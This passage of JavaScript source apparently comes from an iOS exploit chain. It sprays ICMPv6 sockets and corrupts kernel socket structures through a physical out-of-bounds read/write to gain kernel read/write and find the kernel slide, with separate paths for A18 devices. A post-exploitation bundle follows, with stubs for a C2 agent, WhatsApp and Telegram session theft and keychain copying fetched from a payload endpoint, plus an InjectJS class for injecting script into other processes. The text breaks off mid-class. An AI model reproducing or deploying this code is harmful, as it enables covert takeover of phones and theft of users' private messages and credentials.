        kread_length(kwrite_dst_addr, kwrite_length_buffer, EARLY_KRW_LENGTH);
      }
      memcpy(kwrite_length_buffer, kwrite_src_addr, write_size);
      early_kwrite32bytes(kwrite_dst_addr, kwrite_length_buffer);
      remaining -= write_size;
      write_offset += write_size;
    }
  }
  function kwrite_zone_element(dst, src, len) {
    let CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE = 0x20n;
    if (len < CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) {
      LOG("kwrite_zone_element supports only zone element size >= 0x20");
      return false;
    }
    let write_size = 0n;
    let write_offset = 0n;
    let remaining = BigInt(len);
    while (remaining != 0n) {
      write_size = remaining >= CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE ? CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE : remaining % CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE;
      let kwrite_dst_addr = dst + write_offset;
      let kwrite_src_addr = src + write_offset;
      if (write_size != CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) {
        let adjust = CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE - write_size;
        kwrite_dst_addr -= adjust;
        kwrite_src_addr -= adjust;
      }
      kwrite_length(kwrite_dst_addr, kwrite_src_addr, CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE);
      remaining -= write_size;
      write_offset += write_size;
    }
    return true;
  }
  function kdump(where, size, msg = "") {
    LOG(`[+] ----------- ${msg} ----------`);
    for (let i = 0n; i < size; i += 0x10n) {
      LOG(`[+] [${i.hex()}] ${(where + i).hex()}:\t${early_kread64(where + i).hex()} ${early_kread64(where + i + 8n).hex()}`);
    }
  }
  function krw_sockets_leak_forever() {
    let offset_pcb_socket = 0x40n;
    let offset_socket_so_count = 0x254n;
    let control_socket_addr = early_kread64(control_socket_pcb + offset_pcb_socket);
    let rw_socket_addr = early_kread64(rw_socket_pcb + offset_pcb_socket);
    if (control_socket_addr == 0n || rw_socket_addr == 0n) {
      LOG("[-] Couldn't find control_socket_addr || rw_socket_addr");
      exit(0n);
    }
    let control_socket_so_count = early_kread64(control_socket_addr + offset_socket_so_count);
    let rw_socket_so_count = early_kread64(rw_socket_addr + offset_socket_so_count);
    early_kwrite64(control_socket_addr + offset_socket_so_count, control_socket_so_count + 0x0000100100001001n);
    early_kwrite64(rw_socket_addr + offset_socket_so_count, rw_socket_so_count + 0x0000100100001001n);
    let icmp6filt_offset = 0x148n;
    early_kwrite64(rw_socket_pcb + icmp6filt_offset + 0x8n, 0n);
  }
  let socket_ports = [];
  let socket_pcb_ids = [];
  let socket_ports_count = 0n;
  let getsockopt_read_length = 32n;
  let getsockopt_read_data = calloc(1n, getsockopt_read_length);
  let socket_info = calloc(1n, 0x400n);
  function spray_socket(socket_ports, socket_pcb_ids) {
    let fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
    if (fd == 0xFFFFFFFFFFFFFFFFn) {
      LOG("[-] socket create failed!!!");
      return fd;
    }
    let output_socket_port = new_bigint();
    fileport_makeport(fd, get_bigint_addr(output_socket_port));
    close(fd);
    let r = syscall(336n, 6n, getpid(), 3n, output_socket_port, socket_info, 0x400n);
    let inp_gencnt = uread64(socket_info + 0x110n);
    socket_ports.push(output_socket_port);
    socket_pcb_ids.push(inp_gencnt);
    return output_socket_port;
  }
  function sockets_release() {
    for (let sock_idx = 0n; sock_idx < socket_ports_count; sock_idx++) {
      let port = socket_ports.pop();
      mach_port_deallocate(mach_task_self(), port);
      socket_pcb_ids.pop();
    }
    socket_ports_count = 0n;
  }
  function create_surface_with_address(address, size) {
    let properties = CFDictionaryCreateMutable(kCFAllocatorDefault, 0n, kCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks);
    let address_ptr = new_uint64_t(address);
    let address_number = CFNumberCreate(kCFAllocatorDefault, 11n, address_ptr);
    CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfaceAddress")), address_number);
    let size_ptr = new_uint64_t(size);
    let size_number = CFNumberCreate(kCFAllocatorDefault, 9n, size_ptr);
    CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfaceAllocSize")), size_number);
    let surface = IOSurfaceCreate(properties);
    IOSurfacePrefetchPages(surface);
    free(address_ptr);
    free(size_ptr);
    CFRelease(address_number);
    CFRelease(size_number);
    CFRelease(properties);
    return surface;
  }
  let mlock_dict = {};
  function surface_mlock(address, size) {
    let surf = create_surface_with_address(address, size);
    mlock_dict[address] = surf;
  }
  function surface_munlock(address, size) {
    if (mlock_dict[address] != undefined) {
      CFRelease(mlock_dict[address]);
    }
    mlock_dict[address] = undefined;
  }
  function find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, do_read = true) {
    if (do_read == true) {
      physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
    }
    let search_start_idx = 0n;
    let target_found = false;
    let pcb_start_offset = 0n;
    let icmp6filt_offset = 0x148n;
    let found = 0n;
    do {
      found = memmem(read_buffer + search_start_idx, oob_size - search_start_idx, executable_name, strlen(executable_name));
      if (found != 0n) {
        pcb_start_offset = found - read_buffer & 0xFFFFFFFFFFFFFC00n;
        if (uread64(read_buffer + pcb_start_offset + icmp6filt_offset + 0x8n) == 0x0000ffffffffffffn) {
          target_found = true;
          break;
        }
      }
      search_start_idx += 0x400n;
    } while (found != 0n && search_start_idx < oob_size);
    if (target_found == true) {
      LOG("[+] pcb_start_offset: " + pcb_start_offset.hex());
      let target_inp_gencnt = uread64(read_buffer + pcb_start_offset + 0x78n);
      LOG("[+] target_inp_gencnt: " + target_inp_gencnt.hex());
      if (target_inp_gencnt == socket_pcb_ids[socket_ports_count - 1n]) {
        LOG(`[-] Found last PCB`);
        return -1n;
      }
      let is_our_pcb = false;
      let control_socket_idx = undefined;
      for (let sock_idx = 0n; sock_idx < socket_ports_count; sock_idx++) {
        if (socket_pcb_ids[sock_idx] == target_inp_gencnt) {
          is_our_pcb = true;
          control_socket_idx = sock_idx;
          break;
        }
      }
      if (is_our_pcb == false) {
        LOG(`[-] Found freed PCB Page!`);
        return -1n;
      }
      if (target_inp_gencnt_list.includes(target_inp_gencnt)) {
        LOG(`[-] Found old PCB Page!!!!`);
        return -1n;
      } else {
        target_inp_gencnt_list.push(target_inp_gencnt);
      }
      let inp_list_next_pointer = uread64(read_buffer + pcb_start_offset + 0x28n) - 0x20n;
      let icmp6filter = uread64(read_buffer + pcb_start_offset + icmp6filt_offset);
      LOG("[+] inp_list_next_pointer: " + inp_list_next_pointer.hex());
      LOG("[+] icmp6filter: " + icmp6filter.hex());
      rw_socket_pcb = BigInt(inp_list_next_pointer);
      memcpy(write_buffer, read_buffer, oob_size);
      uwrite64(write_buffer + pcb_start_offset + icmp6filt_offset, inp_list_next_pointer + icmp6filt_offset);
      uwrite64(write_buffer + pcb_start_offset + icmp6filt_offset + 0x8n, 0n);
      LOG("[+] Corrupting icmp6filter pointer...");
      while (true) {
        physical_oob_write_mo(memory_object, seeking_offset, oob_size, oob_offset, write_buffer);
        physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
        let new_icmp6filter = uread64(read_buffer + pcb_start_offset + icmp6filt_offset);
        if (new_icmp6filter == inp_list_next_pointer + icmp6filt_offset) {
          LOG("[+] target corrupted: " + uread64(read_buffer + pcb_start_offset + icmp6filt_offset).hex());
          break;
        }
      }
      let sock = fileport_makefd(socket_ports[control_socket_idx]);
      let res = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, getsockopt_read_data, get_bigint_addr(getsockopt_read_length));
      if (res != 0n) {
        LOG("[-] getsockopt failed!!!");
        exit(0n);
      }
      let marker = uread64(getsockopt_read_data);
      if (marker != 0xffffffffffffffffn) {
        LOG("[+] Found control_socket at idx: " + control_socket_idx.hex());
        control_socket = sock;
        rw_socket = fileport_makefd(socket_ports[control_socket_idx + 0x1n]);
        return KERN_SUCCESS;
      } else {
        LOG("[-] Failed to corrupt control_socket at idx: " + control_socket_idx.hex());
      }
    }
    return -1n;
  }
  let kernel_base = 0n;
  let kernel_slide = 0n;
  let is_a18_devices = false;
  function pe_v1() {
    let n_of_total_search_mapping_pages = 0x1000n * 0x10n;
    if (is_a18_devices) {
      n_of_total_search_mapping_pages = 0x10n * 0x10n;
    }
    let search_mapping_size = 0x2000n * PAGE_SIZE;
    if (is_a18_devices) {
      search_mapping_size = 0x10n * PAGE_SIZE;
    }
    let total_search_mapping_size = n_of_total_search_mapping_pages * PAGE_SIZE;
    let n_of_search_mappings = total_search_mapping_size / search_mapping_size;
    let read_buffer = calloc(1n, oob_size);
    let write_buffer = calloc(1n, oob_size);
    initialize_physical_read_write(n_of_oob_pages * PAGE_SIZE);
    let wired_mapping = new_bigint();
    let wired_mapping_size = 1024n * 1024n * 1024n * 3n;
    if (is_a18_devices) {
      kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(wired_mapping), wired_mapping_size, VM_FLAGS_ANYWHERE);
      LOG(`[+] wired_mapping: ${wired_mapping.hex()}`);
    }
    let target_inp_gencnt_list = [];
    while (true) {
      if (is_a18_devices) {
        surface_mlock(wired_mapping, wired_mapping_size);
        for (let s = 0n; s < wired_mapping_size / 0x4000n; s++) {
          uwrite64(wired_mapping + s * 0x4000n, 0n);
        }
      }
      let search_mappings = [];
      for (let s = 0n; s < n_of_search_mappings; s++) {
        let search_mapping_address = new_bigint();
        kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(search_mapping_address), search_mapping_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
        if (kr != KERN_SUCCESS) {
          LOG("[-] mach_vm_allocate failed!!!");
          exit(0n);
        }
        for (let k = 0n; k < search_mapping_size; k += PAGE_SIZE) {
          uwrite64(search_mapping_address + k, random_marker);
        }
        search_mappings.push(search_mapping_address);
      }
      socket_ports = [];
      socket_pcb_ids = [];
      socket_ports_count = 0n;
      const OPEN_MAX = 10240n;
      let maxfiles = 3n * OPEN_MAX;
      let leeway = 4096n * 2n;
      for (let socket_count = 0n; socket_count < maxfiles - leeway; socket_count++) {
        let port = spray_socket(socket_ports, socket_pcb_ids);
        if (port == 0xFFFFFFFFFFFFFFFFn) {
          LOG("[-] Failed to spray sockets: " + socket_ports_count.hex());
          break;
        } else {
          socket_ports_count++;
        }
      }
      let start_pcb_id = socket_pcb_ids[0];
      let end_pcb_id = socket_pcb_ids[socket_ports_count - 1n];
      LOG(`[i] socket_ports_count: ${socket_ports_count.hex()}`);
      LOG(`[i] start_pcb_id: ${start_pcb_id.hex()}`);
      LOG(`[i] end_pcb_id: ${end_pcb_id.hex()}`);
      let success = false;
      for (let s = 0n; s < n_of_search_mappings; s++) {
        let search_mapping_address = search_mappings[s];
        LOG("[i] looking in search mapping: " + s);
        let memory_object = new_bigint();
        let memory_object_size = BigInt(search_mapping_size);
        kr = mach_make_memory_entry_64(mach_task_self(), get_bigint_addr(memory_object_size), search_mapping_address, VM_PROT_DEFAULT, get_bigint_addr(memory_object), 0n);
        if (kr != 0n) {
          LOG("[-] mach_make_memory_entry_64 failed!!!");
          exit(0n);
        }
        surface_mlock(search_mapping_address, search_mapping_size);
        let seeking_offset = 0n;
        // ClearSword: stop before last page(s) - overlay needs n_of_oob_pages contiguous;
        // seeking_offset == size - PAGE would map one page OOB -> helper mach_vm_map fail -> exit.
        while (seeking_offset <= search_mapping_size - n_of_oob_pages * PAGE_SIZE) {
          kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
          if (kr == KERN_SUCCESS) {
            if (find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, false) == KERN_SUCCESS) {
              success = true;
              break;
            }
          }
          seeking_offset += PAGE_SIZE;
        }
        kr = mach_port_deallocate(mach_task_self(), memory_object);
        if (kr != KERN_SUCCESS) {
          LOG("[-] mach_port_deallocate failed!!!");
          exit(0n);
        }
        if (success == true) {
          break;
        }
      }
      sockets_release();
      for (let s = 0n; s < n_of_search_mappings; s++) {
        let search_mapping_address = search_mappings.pop();
        kr = mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
      }
      if (is_a18_devices) {
        surface_munlock(wired_mapping, wired_mapping_size);
      }
      if (success == true) {
        break;
      }
    }
  }
  function pe_v2() {
    let read_buffer = calloc(1n, oob_size);
    let write_buffer = calloc(1n, oob_size);
    initialize_physical_read_write(n_of_oob_pages * PAGE_SIZE);
    let getsockopt_read_length = 32n;
    let getsockopt_read_data = calloc(1n, getsockopt_read_length);
    let wired_mapping_entry_size = PAGE_SIZE;
    let wired_mapping_entries_total_size = 1024n * 1024n * 1024n * 2n;
    let n_of_wired_mapping_entries = wired_mapping_entries_total_size / wired_mapping_entry_size;
    let wired_mapping_entries_addresses = [];
    LOG("[i] Allocating memory");
    let kr = KERN_SUCCESS;
    let wired_address = 0n;
    for (let i = 0n; i < n_of_wired_mapping_entries; i++) {
      if (i == 0n) {
        wired_address = new_bigint();
        do {
          kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(wired_address), wired_mapping_entry_size, VM_FLAGS_ANYWHERE);
        } while (kr != KERN_SUCCESS);
      } else {
        wired_address = BigInt(wired_mapping_entries_addresses.slice(-1));
        do {
          wired_address += wired_mapping_entry_size;
          kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(wired_address), wired_mapping_entry_size, VM_FLAGS_FIXED);
        } while (kr != KERN_SUCCESS);
      }
      wired_mapping_entries_addresses.push(wired_address);
      surface_mlock(wired_address, wired_mapping_entry_size);
      uwrite64(wired_address, wired_page_marker);
      uwrite64(wired_address + 0x8n, wired_address);
    }
    let target_inp_gencnt_list = [];
    LOG("[i] Allocating memory done");
    while (true) {
      let search_mapping_size = 0x800n * PAGE_SIZE;
      let search_mapping_address = new_bigint();
      kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(search_mapping_address), search_mapping_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
      if (kr != KERN_SUCCESS) {
        LOG("[-] mach_vm_allocate failed!!!");
        exit(0n);
      }
      for (let k = 0n; k < search_mapping_size; k += PAGE_SIZE) {
        uwrite64(search_mapping_address + k, random_marker);
      }
      surface_mlock(search_mapping_address, search_mapping_size);
      let memory_object = new_bigint();
      let memory_object_size = BigInt(search_mapping_size);
      kr = mach_make_memory_entry_64(mach_task_self(), get_bigint_addr(memory_object_size), search_mapping_address, VM_PROT_DEFAULT, get_bigint_addr(memory_object), 0n);
      if (kr != 0n) {
        LOG("[-] mach_make_memory_entry_64 failed!!!");
        exit(0n);
      }
      socket_ports = [];
      socket_pcb_ids = [];
      socket_ports_count = 0n;
      let max_sockets_count = 0x5800n;
      let split_count = 8n;
      let wired_pages = [];
      let success = false;
      let seeking_offset = 0n;
      // ClearSword: stop before last page(s) - overlay needs n_of_oob_pages contiguous;
        // seeking_offset == size - PAGE would map one page OOB -> helper mach_vm_map fail -> exit.
        while (seeking_offset <= search_mapping_size - n_of_oob_pages * PAGE_SIZE) {
        kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
        if (kr != KERN_SUCCESS) {
          seeking_offset += PAGE_SIZE;
          continue;
        }
        if (uread64(read_buffer) == wired_page_marker) {
          let wired_page = uread64(read_buffer + 0x8n);
          LOG(`[i] seeking_offset: ${seeking_offset.hex()}: Found wired_page: ${wired_page.hex()}`);
          if (wired_pages.indexOf(wired_page) == -1) {
            wired_pages.push(wired_page);
            let idx = wired_mapping_entries_addresses.indexOf(wired_page);
            wired_mapping_entries_addresses.splice(idx, 1);
            uwrite64(wired_page, 0n);
            uwrite64(wired_page + 0x8n, 0n);
          } else {
            LOG(`[-] Found old wired page!!!!`);
            seeking_offset += PAGE_SIZE;
            continue;
          }
          kr = mach_vm_deallocate(mach_task_self(), wired_page, wired_mapping_entry_size);
          if (kr != KERN_SUCCESS) {
            LOG(`[-] Failed to deallocate wired page!!!!`);
          }
          for (let socket_count = 0n; socket_count < max_sockets_count / split_count; socket_count++) {
            let port = spray_socket(socket_ports, socket_pcb_ids);
            if (port == 0xFFFFFFFFFFFFFFFFn) {
              LOG("[-] Failed to spray sockets: " + socket_ports_count.hex());
              break;
            } else {
              socket_ports_count++;
            }
          }
          if (find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, true) == KERN_SUCCESS) {
            LOG(`[i] seeking_offset: ${seeking_offset.hex()}: Reallocated PCB page`);
            success = true;
            break;
          } else {
            if (socket_ports_count >= max_sockets_count) {
              sockets_release();
              LOG("[+] waiting for zone trimming...");
              sleep(20n);
            }
            seeking_offset = 0n;
          }
        } else if (find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, false) == KERN_SUCCESS) {
          LOG(`[i] seeking_offset: ${seeking_offset.hex()}: Found PCB page`);
          success = true;
          break;
        } else {
          seeking_offset += PAGE_SIZE;
        }
      }
      kr = mach_port_deallocate(mach_task_self(), memory_object);
      if (kr != KERN_SUCCESS) {
        LOG("[-] mach_port_deallocate failed!!!");
        exit(0n);
      }
      sockets_release();
      kr = mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
      if (success == true) {
        break;
      }
    }
    for (let i = 0n; i < BigInt(wired_mapping_entries_addresses.length); i++) {
      let wired_page = wired_mapping_entries_addresses[i];
      mach_vm_deallocate(mach_task_self(), wired_page, wired_mapping_entry_size);
    }
  }
  function pe() {
    let device_machine = get_device_machine();
    if (strstr(device_machine, get_cstring("iPhone17,")) != 0n) {
      LOG("[+] Running on A18 Devices");
      is_a18_devices = true;
      sleep(8n);
      pe_init();
      pe_v2();
    } else {
      LOG("[+] Running on non-A18 Devices");
      pe_init();
      pe_v1();
    }
    LOG(`[+] highiest_success_idx: ${highiest_success_idx}`);
    LOG(`[+] success_read_count: ${success_read_count}`);
    uwrite64(go_sync_ptr, 0n);
    uwrite64(race_sync_ptr, 1n);
    js_thread_join(free_thread_jsthread);
    close(write_fd);
    close(read_fd);
    control_socket_pcb = early_kread64(rw_socket_pcb + 0x20n);
    let pcbinfo_pointer = early_kread64(control_socket_pcb + 0x38n);
    let ipi_zone = early_kread64(pcbinfo_pointer + 0x68n);
    let zv_name = early_kread64(ipi_zone + 0x10n);
    kernel_base = zv_name & 0xFFFFFFFFFFFFC000n;
    while (true) {
      if (early_kread64(kernel_base) == 0x100000cfeedfacfn) {
        if (early_kread64(kernel_base + 0x8n) == 0xc00000002n) {
          break;
        }
      }
      kernel_base -= PAGE_SIZE;
    }
    kernel_slide = kernel_base - 0xfffffff007004000n;
    krw_sockets_leak_forever();
  }
  mpd_js_thread_spawn = js_thread_spawn;
  mpd_js_thread_join = js_thread_join;
  mpd_pe = pe;
  mpd_kread64 = early_kread64;
  mpd_kwrite64 = early_kwrite64;
  mpd_kwrite_length = kwrite_length;
  mpd_kread_length = kread_length;
  mpd_kwrite_zone_element = kwrite_zone_element;
  mpd_control_socket = function() { return control_socket; }
  mpd_rw_socket = function() { return rw_socket; }
  mpd_pacia_gadget = function() { return dyld_signPointer_gadget; }
  mpd_kernel_slide = function (addr = 0n) {
    return addr + kernel_slide;
  };
  mpd_kernel_base = function () {
    return kernel_base;
  };
  pe();
   
  LOG("[+] PE Post-Exploitation !!!");
  try {
    LOG("[+] kernel_base: " + mpd_kernel_base().hex());
    LOG("[+] kernel_slide: " + mpd_kernel_slide().hex());
  } catch (kbE) {
    LOG("[PE] kernel_base log fail: " + String(kbE).slice(0, 120));
  }
  LOG("[PE] webpackBootstrap begin");
  let main = {};
  main.chainData = {
	  "chosenOffsets": null
  }
  
  try {
	  /******/ (() => { // webpackBootstrap
/******/ 	"use strict";
/******/ 	var __webpack_modules__ = ({

/***/ "./node_modules/raw-loader/dist/cjs.js!./dist/MigFilterBypassThread.js":
/*!*****************************************************************************!*\
  !*** ./node_modules/raw-loader/dist/cjs.js!./dist/MigFilterBypassThread.js ***!
  \*****************************************************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
/* harmony export */ });
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("// MigFilterBypassThread omitted (PE slim - hot via /api/payload/get)\n// peResolveMigThreadCode() fetches before threadSpawn.\n");

/***/ }),

/***/ "./node_modules/raw-loader/dist/cjs.js!./src/loader.js":
/*!*************************************************************!*\
  !*** ./node_modules/raw-loader/dist/cjs.js!./src/loader.js ***!
  \*************************************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
/* harmony export */ });
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("// loader.js omitted (PE slim; SKIP_SB_LOADER=true)\n");

/***/ }),


/***/ "./node_modules/raw-loader/dist/cjs.js!./src/c2_agent.js":
/*!****************************************************************!*\
  !*** ./node_modules/raw-loader/dist/cjs.js!./src/c2_agent.js ***!
  \****************************************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
/* harmony export */ });
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("// c2_agent omitted (sync_pe_payloads default stub; use --full-agent to embed)\n// Hot-load via pe_load / hot_load_agent.py when needed.\n");

/***/ }),


/***/ "./node_modules/raw-loader/dist/cjs.js!./src/c2_bootstrap.js":
/*!***************************!*\
  !*** ./src/c2_bootstrap.js !***
  \***************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
/* harmony export */ });
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("// c2_bootstrap omitted (PE slim - hot via /api/payload/get)\n// peResolveBootstrapSrc() fetches plaintext at inject/ensure_bs time.\n");

/***/ }),
/***/ "./node_modules/raw-loader/dist/cjs.js!./src/c2_mem_loader.js":
/*!****************************!*\
  !*** ./src/c2_mem_loader.js !***
  \****************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
/* harmony export */ });
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("// c2_mem_loader omitted (PE slim; C2_STUB_ONLY skips agent mem load)\n// Hot path: pe_load c2_agent.js after authorize.\n");

/***/ }),
/***/ "./node_modules/raw-loader/dist/cjs.js!./src/c2_probe.js":
/*!***********************!*\
  !*** ./src/c2_probe.js !***
  \***********************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
/* harmony export */ });
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("// c2_probe omitted (PE slim - hot via peResolveModule)\n");

/***/ }),
/***/ "./node_modules/raw-loader/dist/cjs.js!./src/session_probe.js":
/*!****************************!*\
  !*** ./src/session_probe.js !***
  \****************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
/* harmony export */ });
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("// session_probe omitted (PE slim - hot via pe_load session_probe.js)\n// Then pe_session_start; pe reads /tmp/c2_ipc/mod.session_probe\n");

/***/ }),
/***/ "./node_modules/raw-loader/dist/cjs.js!./src/session_whatsapp.js":
/*!*******************************!*\
  !*** ./src/session_whatsapp.js !***
  \*******************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
/* harmony export */ });
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("// session_whatsapp omitted (PE slim - hot via pe_load session_whatsapp.js)\n// Then pe_session_start payload=whatsapp\n");

/***/ }),
/***/ "./node_modules/raw-loader/dist/cjs.js!./src/session_telegram.js":
/*!*******************************!*\
  !*** ./src/session_telegram.js !***
  \*******************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
/* harmony export */ });
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("// session_telegram omitted (PE slim - hot via pe_load session_telegram.js)\n// Then pe_session_start payload=telegram (partner tglib)\n");

/***/ }),
/***/ "./node_modules/raw-loader/dist/cjs.js!./src/keychain_copier.js":
/*!**********************************************************************!*\
  !*** ./node_modules/raw-loader/dist/cjs.js!./src/keychain_copier.js ***!
  \**********************************************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
/* harmony export */ });
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("// keychain_copier omitted (PE slim - hot via pe_load keychain_copier.js)\n");

/***/ }),

/***/ "./src/InjectJS.js":
/*!*************************!*\
  !*** ./src/InjectJS.js ***!
  \*************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ InjectJS)
/* harmony export */ });
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/TaskRop/RemoteCall */ "./src/libs/TaskRop/RemoteCall.js");
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! libs/TaskRop/Sandbox */ "./src/libs/TaskRop/Sandbox.js");


const TAG = "INJECTJS";
function injLog(msg) {
	let s = String(msg == null ? "" : msg);
	let keep =
		s.indexOf("Start injecting") === 0 ||
		s.indexOf("Unable to inject") === 0 ||
		s.indexOf("RemoteCall OK") === 0 ||
		s.indexOf("All done!") === 0 ||
		s.indexOf("Invoking not found") === 0 ||
		s.indexOf("evaluateScript TIMEOUT") === 0 ||
		s.indexOf("evaluateScript RC timeout") === 0 ||
		s.indexOf("JS file load FAILED") === 0 ||
		s.indexOf("JS script via file") === 0 ||
		s.indexOf("scriptStr ") === 0 ||
		s.indexOf("applyTokens") === 0 ||
		s.indexOf("background evaluateScript") === 0 ||
		s.indexOf("NSThread evaluateScript") === 0 ||
		s.indexOf("same-thread evaluateScript") === 0 ||
		s.indexOf("cold probe") === 0 ||
		s.indexOf("CFStringCreate path") === 0 ||
		s.indexOf("scriptStr length ABSURD") === 0 ||
		s.indexOf("scriptStr rebuilt") === 0 ||
		s.indexOf("FAIL") >= 0 ||
		s.indexOf("ERR:") >= 0 ||
		s.indexOf("TIMEOUT") >= 0 ||
		s.indexOf("MATCH") >= 0 ||
		s.indexOf("MISMATCH") >= 0;
	if (!keep) return;
	try { console.log(TAG, s); } catch (_) {}
	try { if (typeof globalThis.LOG === "function") globalThis.LOG("[INJECTJS] " + s); } catch (_) {}
}

const RTLD_LAZY = 0x1;
const RTLD_DEFAULT = 0xfffffffffffffffen;

class InjectJS {

	task;
	#target;
	#injectCode;
	#migFilterBypass;
	#invokingAddr;
	#JSContextClass;
	#NSMethodSignatureClass;
	#NSInvocationClass;
	#invokeUsingIMPSel;
	#syncEval;
	#injFilePath;
	#skipInjFileWrite;
	#applyTokensBefore;
	#skipDiag;
	#forceCfString;

	constructor(target, injectCode, migFilterBypass=null, syncEval=false, opts=null) {
		this.#target = target;
		this.#injectCode = injectCode;
		this.#migFilterBypass = migFilterBypass;
		this.#syncEval = !!syncEval;
		opts = opts || {};
		this.#injFilePath = opts.injFilePath ? String(opts.injFilePath) : "";
		this.#skipInjFileWrite = !!opts.skipInjFileWrite;
		// Session/keychain need sandbox tokens DURING evaluateScript (collect/copy).
		// Applying after a timed-out sync eval deadlocks RC (trojan still in JS).
		this.#applyTokensBefore = opts.applyTokensBefore !== undefined
			? !!opts.applyTokensBefore
			: !!syncEval;
		this.#forceCfString = !!opts.forceCfString;
		// Default SKIP diag ladder for production inject - ladder already proved
		// invoker/Native/class/file-8k OK; repeated evaluateScript before large payload
		// may leave JSC/autorelease in a bad state. Set injectDiag:true or PE_INJECT_DIAG to enable.
		if (opts.injectDiag || globalThis.PE_INJECT_DIAG) {
